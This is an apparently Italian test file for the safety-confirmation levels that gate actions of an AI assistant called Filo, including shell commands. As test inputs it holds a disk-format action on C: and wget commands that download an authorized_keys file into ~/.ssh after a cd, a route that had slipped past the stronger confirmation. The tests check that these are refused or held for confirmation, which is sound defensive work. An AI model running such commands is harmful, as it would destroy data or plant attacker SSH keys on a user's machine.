// #146.2 — Framework dei livelli di sicurezza per le azioni di Filo.
//
// Verifica il contratto della spec: livello 1 esegue subito; livello 2 NON
// esegue finché l'utente non conferma dal popup; livello 3 richiede di
// digitare "conferma"; le azioni NON registrate vengono rifiutate dal
// dispatch (anche se arrivano già "confermate" dal client).

import { test, expect } from './fixtures/electron.mjs';
import { CONFIRM_HOST, confirmState, confirmText, clickConfirm, fillConfirmInput } from './helpers/confirm.mjs';

const NEWTAB = 'filo://newtab/';

// Esegue un'azione Filo nel main process, come farebbe la chat (handleFiloChat).
const execAction = (app, action, opts) =>
  app.evaluate((_electron, { action, opts }) =>
    globalThis.SN_EXECUTE_FILO_ACTION(action, opts), { action, opts });

const getSettings = (page) =>
  page.evaluate(async () => (await chrome.runtime.sendMessage({ type: 'get_settings' })).settings);

test('livello 1 esegue subito, senza chiedere nulla', async ({ app, openTab }) => {
  const page = await openTab(NEWTAB);
  const r = await execAction(app, { type: 'TIMER', seconds: 60, label: 'Pasta' });
  expect(r.executed).toBe(true);
  // Il timer esiste davvero.
  const timers = await page.evaluate(async () =>
    (await chrome.runtime.sendMessage({ type: 'filo_get_timers' })).timers);
  expect(timers.some((t) => t.label === 'Pasta')).toBe(true);
});

test('livello 2 non esegue senza conferma; la conferma esegue davvero', async ({ app, openTab }) => {
  const page = await openTab(NEWTAB);
  const action = { type: 'IMPOSTA_PREFERENZA', chiave: 'terminale', valore: 'on' };

  // Senza conferma: l'azione NON viene eseguita, torna al client con il
  // livello e la spiegazione per il popup.
  const r = await execAction(app, action);
  expect(r.executed).toBe(false);
  expect(r.kept).toBe(true);
  expect(r.needsConfirm).toBe(2);
  expect(r.describe).toContain('erminale');
  expect((await getSettings(page)).terminal?.enabled || false).toBe(false);

  // Con la conferma dell'utente (MSG.FILO_CONFIRM_ACTION): esegue.
  const c = await page.evaluate(async (a) =>
    chrome.runtime.sendMessage({ type: 'filo_confirm_action', action: a }), action);
  expect(c.executed).toBe(true);
  expect((await getSettings(page)).terminal?.enabled).toBe(true);
});

test('le azioni non registrate sono rifiutate, anche se "confermate"', async ({ app, openTab }) => {
  const page = await openTab(NEWTAB);
  const evil = { type: 'FORMATTA_DISCO', target: 'C:' };

  const r = await execAction(app, evil);
  expect(r.executed).toBe(false);
  expect(r.kept).toBe(false);

  // Il server riclassifica al momento della conferma: un client compromesso
  // non può far eseguire un'azione fuori registro.
  const c = await page.evaluate(async (a) =>
    chrome.runtime.sendMessage({ type: 'filo_confirm_action', action: a }), evil);
  expect(c.executed).toBe(false);
});

test('il bottone in chat apre il popup di conferma: Annulla non applica, OK applica', async ({ openTab }) => {
  const page = await openTab(NEWTAB);
  const action = {
    type: 'IMPOSTA_PREFERENZA', chiave: 'terminale', valore: 'on',
    _confirm: { level: 2, text: 'Impostare: Modalità terminale → attiva' },
  };

  // Renderizza l'azione come farebbe una bolla di chat (hook di test, stesso
  // pattern di window.__filoEditorFormat nell'editor).
  await page.evaluate((a) => {
    const host = document.createElement('div');
    host.id = 'test-actions';
    document.body.appendChild(host);
    window.__filoDashActions.renderActions(host, [a]);
  }, action);

  const btn = page.locator('#test-actions .dash-action-btn');
  await expect(btn).toBeVisible();

  // Annulla → nessuna modifica.
  await btn.click();
  const host = page.locator(CONFIRM_HOST);
  await expect(host).toBeVisible();
  await expect.poll(() => confirmText(page)).toContain('Modalità terminale');
  await clickConfirm(page, 'cancel');
  await expect(host).toHaveCount(0);
  expect((await getSettings(page)).terminal?.enabled || false).toBe(false);

  // OK → la preferenza cambia davvero.
  await btn.click();
  await clickConfirm(page, 'ok');
  await expect.poll(async () => (await getSettings(page)).terminal?.enabled).toBe(true);
  await expect(btn).toContainText('✓');
});

test('#183: più impostazioni di livello 2 in una risposta → i popup si aprono in sequenza, nessun chip inerte da cliccare', async ({ openTab }) => {
  const page = await openTab(NEWTAB);
  // Due impostazioni sensibili nella stessa risposta (come nel feedback #183:
  // "voglio non crei bottoni ma applichi direttamente").
  const actions = [
    {
      type: 'IMPOSTA_PREFERENZA', chiave: 'terminale', valore: 'on',
      _confirm: {
        level: 2,
        text: 'Filo vuole impostare: Modalità terminale → attiva.\n\n'
          + 'Questa impostazione decide se Filo può eseguire comandi nella shell del tuo computer.',
      },
    },
    {
      type: 'IMPOSTA_PREFERENZA', chiave: 'gestione_cookie', valore: 'privacy',
      _confirm: {
        level: 2,
        text: 'Filo vuole impostare: Gestione cookie → Privacy.\n\n'
          + 'Decide come Filo gestisce i cookie dei siti.',
      },
    },
  ];

  // Renderizza come una risposta FRESCA della chat (autoConfirm:true).
  await page.evaluate((acts) => {
    const host = document.createElement('div');
    host.id = 'test-actions-multi';
    document.body.appendChild(host);
    window.__filoDashActions.renderActions(host, acts, { autoConfirm: true });
  }, actions);

  const host = page.locator(CONFIRM_HOST);

  // Il PRIMO popup si apre DA SOLO (nessun click manuale) e spiega cosa fa + il rischio.
  await expect(host).toBeVisible();
  await expect.poll(() => confirmText(page)).toContain('Modalità terminale');
  expect(await confirmText(page)).toContain('shell');
  await clickConfirm(page, 'ok');

  // Chiuso il primo, si apre DA SOLO il SECONDO (sequenziale: niente stacking).
  await expect.poll(() => confirmText(page)).toContain('Gestione cookie');
  await clickConfirm(page, 'ok');
  await expect(host).toHaveCount(0);

  // Entrambe applicate davvero (asserisce il SUCCESSO, non l'assenza di errore).
  await expect.poll(async () => (await getSettings(page)).terminal?.enabled).toBe(true);
  await expect.poll(async () => (await getSettings(page)).security?.cookies?.mode).toBe('privacy');
});

test('livello 3: il bottone resta bloccato finché non si digita "conferma"', async ({ openTab }) => {
  const page = await openTab(NEWTAB);

  await page.evaluate(() => {
    window.__typedResult = undefined;
    window.SN_CONFIRM_UI.confirmTyped({ title: 'Eliminazione', text: 'Eliminare tutto.' })
      .then((r) => { window.__typedResult = r; });
  });

  const host = page.locator(CONFIRM_HOST);
  await expect(host).toBeVisible();
  await expect.poll(async () => (await confirmState(page)).okDisabled).toBe(true);

  // Parola sbagliata → ancora bloccato.
  await fillConfirmInput(page, 'confermo');
  await expect.poll(async () => (await confirmState(page)).okDisabled).toBe(true);

  // Parola giusta → si sblocca ed esegue.
  await fillConfirmInput(page, 'conferma');
  await expect.poll(async () => (await confirmState(page)).okDisabled).toBe(false);
  await clickConfirm(page, 'danger');
  await expect(host).toHaveCount(0);
  expect(await page.evaluate(() => window.__typedResult)).toBe(true);
});

// #479 — scaricare dentro una cartella sensibile passava dalla conferma leggera.
// `wget -O ~/.ssh/…` chiedeva di digitare "conferma"; `wget -P ~/.ssh …`, e
// soprattutto un `cd ~/.ssh` (eseguito subito, senza chiedere niente, valido per
// i comandi successivi) seguito da un normale `wget`, si fermavano all'OK. Stesso
// effetto — un file scelto dal server che atterra su una chiave SSH — quindi
// stessa conferma. E il popup deve dire DOVE il comando agisce: nel testo del
// comando la cartella non compare.
test('#479: scaricare dopo essersi spostati in una cartella sensibile chiede "conferma", e il popup dice dove', async ({ app, openTab }) => {
  const page = await openTab(NEWTAB);
  // La modalità terminale è il gate hard: senza, nessun comando arriva al livello.
  await page.evaluate(async () => chrome.runtime.sendMessage({
    type: 'filo_confirm_action',
    action: { type: 'IMPOSTA_PREFERENZA', chiave: 'terminale', valore: 'on' },
  }));

  // 1) Lo spostamento resta gratuito: è la primitiva di navigazione dell'assistente.
  const cd = await execAction(app, { type: 'ESEGUI_COMANDO', comando: 'cd .ssh' });
  expect(cd.needsConfirm).toBeFalsy();

  // 2) Il download SENZA flag di output — la strada che restava scoperta —
  //    ora chiede di digitare "conferma".
  const dl = await execAction(app, { type: 'ESEGUI_COMANDO', comando: 'wget http://esempio.test/authorized_keys' });
  expect(dl.executed).toBe(false);
  expect(dl.needsConfirm).toBe(3);
  // 3) …e il popup dice in quale cartella il file andrebbe a finire.
  expect(dl.describe).toContain('wget http://esempio.test/authorized_keys');
  expect(dl.describe).toMatch(/Cartella di lavoro:\s*\S+/);
  expect(dl.describe).toContain('.ssh');

  // Anche la forma che sceglie la CARTELLA, e quella che riprende un download
  // su un file già esistente, sono allo stesso livello.
  for (const comando of [
    'wget -P /home/utente/.ssh http://esempio.test/authorized_keys',
    'wget -c http://esempio.test/authorized_keys',
    'wget -N http://esempio.test/authorized_keys',
  ]) {
    const r = await execAction(app, { type: 'ESEGUI_COMANDO', comando });
    expect(r.needsConfirm, comando).toBe(3);
  }

  // curl senza flag di output stampa a schermo: non fa atterrare niente, resta
  // alla conferma leggera (nessuna frizione aggiunta dove non serve).
  const stampa = await execAction(app, { type: 'ESEGUI_COMANDO', comando: 'curl http://esempio.test/x' });
  expect(stampa.needsConfirm).toBe(2);
});

test('Esc annulla il popup di conferma', async ({ openTab }) => {
  const page = await openTab(NEWTAB);
  await page.evaluate(() => {
    window.__confirmResult = undefined;
    window.SN_CONFIRM_UI.confirm({ text: 'Procedo?' })
      .then((r) => { window.__confirmResult = r; });
  });
  await expect(page.locator(CONFIRM_HOST)).toBeVisible();
  await page.keyboard.press('Escape');
  await expect(page.locator(CONFIRM_HOST)).toHaveCount(0);
  expect(await page.evaluate(() => window.__confirmResult)).toBe(false);
});
